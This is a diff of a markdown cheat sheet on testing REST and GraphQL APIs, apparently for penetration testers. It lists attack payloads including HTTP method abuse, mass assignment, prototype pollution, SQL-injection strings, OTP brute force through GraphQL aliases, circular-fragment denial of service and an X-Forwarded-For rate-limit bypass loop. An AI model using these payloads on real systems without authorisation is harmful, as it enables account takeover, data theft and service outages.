@@ -1,79 +1,164 @@
-# API Security Testing: REST & GraphQL
+# API Security: REST & GraphQL Complete Reference
 
-## API Discovery
+## REST API Testing
 
+### Endpoint Discovery
 ```bash
-# Find API endpoints from JS
-grep -roP '["''](https?://[^"'']+/api/[^"'']+)["'']' ~/js-files/
-# Common patterns
-ffuf -u https://target.com/api/vFUZZ -w numbers.txt -fc 404
-ffuf -u https://api.target.com/vFUZZ -w numbers.txt -fc 404
-# GraphQL endpoint discovery
-ffuf -u https://target.com/FUZZ -w graphql-points.txt
+# Version enumeration
+ffuf -u https://api.target.com/FUZZ -w versions.txt
+# v1, v2, v3, v4, v1.1, v1.2, latest, beta, dev, staging
+
+# Common API paths
+/api, /api/v1, /api/v2, /rest, /rest/v1, /graphql
+/swagger, /api-docs, /swagger-ui, /docs, /openapi.json
+/actuator, /actuator/health, /actuator/info  (Spring Boot)
+/graphql, /graphiql, /playground, /v1/graphql
+
+# Parameter discovery
+/api/users?$filter=, /api/users?$select=
+/api/users?fields=, /api/users?include=
+/api/users?expand=, /api/users?embed=
 ```
 
-## REST API Testing Methodology
+### HTTP Method Abuse
+```bash
+# Test all methods on each endpoint
+curl -X GET /api/users
+curl -X POST /api/users -d '{"name":"admin"}'
+curl -X PUT /api/users -d '{"id":1,"role":"admin"}'
+curl -X PATCH /api/users/1 -d '{"role":"admin"}'
+curl -X DELETE /api/users/1
+curl -X OPTIONS /api/users
+curl -X HEAD /api/users
 
-### HTTP Method Testing
-```http
-# Test every endpoint with all methods
-OPTIONS /api/resource
-GET /api/resource
-POST /api/resource
-PUT /api/resource
-DELETE /api/resource
-PATCH /api/resource
 # Method override headers
-X-HTTP-Method-Override: DELETE
 X-HTTP-Method: PUT
-X-Method-Override: PATCH
+X-HTTP-Method-Override: PUT
+X-Method-Override: PUT
+X-HTTP-Method-Override: DELETE
 ```
 
 ### Content-Type Switching
-```http
-# Switch between JSON and XML parsers
-Content-Type: application/json
+```bash
+# JSON endpoint accepts XML -> potential XXE
 Content-Type: application/xml
-Content-Type: text/plain
+<user><name>admin</name><role>admin</role></user>
+
+# Form data acceptance
 Content-Type: application/x-www-form-urlencoded
-# XML parser may have XXE, JSON parser may be safe
+name=admin&role=admin
+
+# Binary content type
+Content-Type: multipart/form-data
+
+# YAML (potential deserialization)
+Content-Type: application/yaml
 ```
 
-### Mass Assignment
-```http
-POST /api/user/update
-{"name": "test", "role": "admin", "isVerified": true, "balance": 999999}
-# Test extra fields that the endpoint should not accept
+### JSON Attacks
+```json
+// Duplicate keys (last wins in most parsers)
+{"username": "user", "username": "admin", "password": "test"}
+
+// Nested objects
+{"user": {"id": 1, "role": "admin"}}
+
+// Array injection
+{"ids": ["1", "2", "3"]}
+{"ids": ["admin", "role", "' OR 1=1--"]}
+
+// Prototype pollution (Node.js)
+{"__proto__": {"isAdmin": true}}
+{"constructor": {"prototype": {"isAdmin": true}}}
 ```
 
-### Rate Limiting Bypass
+## GraphQL-Specific Attacks
+
+### Introspection Bypass
+```graphql
+# If __schema is blocked
+{ __type(name: "Admin") { name fields { name type { name } } } }
+
+# Clairvoyance (schema reconstruction from errors)
+clairvoyance -u https://target.com/graphql
+
+# Persisted query bypass
+{"query": "mutation { createUser(input: {role: admin}) { id } }",
+ "extensions": {"persistedQuery": {"version": 1, "sha256Hash": "hash"}}}
+
+# Field suggestion bypass
+# Some servers expose field names in error messages
+# Send invalid field to get suggestions
+```
+
+### Batch Attack via Aliases
+```graphql
+# Brute force OTP via aliased mutations
+mutation {
+  a: verifyOTP(otp: 0000) { success }
+  b: verifyOTP(otp: 0001) { success }
+  c: verifyOTP(otp: 0002) { success }
+}
+
+# Mass data extraction via aliases
+query {
+  u1: user(id: 1) { email password role }
+  u2: user(id: 2) { email password role }
+  u3: user(id: 3) { email password role }
+}
+```
+
+### DoS via Deep Recursion
+```graphql
+# Circular fragments (stack overflow)
+query {
+  ...x
+}
+fragment x on Query {
+  ...x
+}
+
+# Deep nesting alias aliasing
+query {
+  a: user(id: 1) { posts { comments { user { ... } } } }
+}
+```
+
+## Rate Limiting Bypass
+
+### IP Rotation
 ```bash
-# IP rotation headers
-X-Forwarded-For: $i
-X-Real-IP: $i
-X-Originating-IP: $i
-# GraphQL batching bypass
-# Authentication endpoint rate limiting via alias abuse
-mutation { a: login(...), b: login(...), ... z: login(...) }
+# X-Forwarded-For header hopping
+for ip in $(seq 1 255); do
+  curl -H "X-Forwarded-For: 10.0.0.$ip" /api/login -d "password=test"
+done
+
+# X-Real-IP, X-Originating-IP, X-Remote-IP
+X-Real-IP: 10.0.0.1
 ```
 
-## API Versioning Attacks
-
+### Distributed Brute Force
 ```bash
-# Test older API versions that may lack auth
-ffuf -u https://api.target.com/vFUZZ/ -w numbers.txt
-# /v1/ vs /v2/ — v1 often has fewer security controls
-# /v3/ might be in beta with debug mode
+# Use multiple endpoints that all authenticate
+/api/v1/login
+/api/v2/login
+/api/mobile/login
+/api/auth/login
+# Each might have separate rate limit
 ```
 
-## Unauthenticated Endpoint Discovery
-
+## API Key Testing
 ```bash
-# Test each endpoint found in JS with all auth removed
-# Check for:
-# - Health/status endpoints
-# - Swagger/OpenAPI docs
-# - GraphQL introspection
-# - Metrics (Prometheus)
-# - Debug endpoints
+# Test if API key is validated against origin
+# Extract API key from JS -> use from different IP
+# Check if API key has admin privileges
+# Rate limit on API key vs IP
 ```
+
+### CVSS Scoring
+| Scenario | CVSS | Criteria |
+|----------|------|---------|
+| GraphQL introspection enabled (info leak) | 5.3 | Network, Low, No auth, Confidentiality medium |
+| GraphQL batch alias brute force | 7.5 | Network, Low, No auth |
+| REST API method abuse (DELETE on user) | 6.5 | Network, Low, User interaction |
+| API key in client-side code | 3.7 | Network, Low, User interaction |
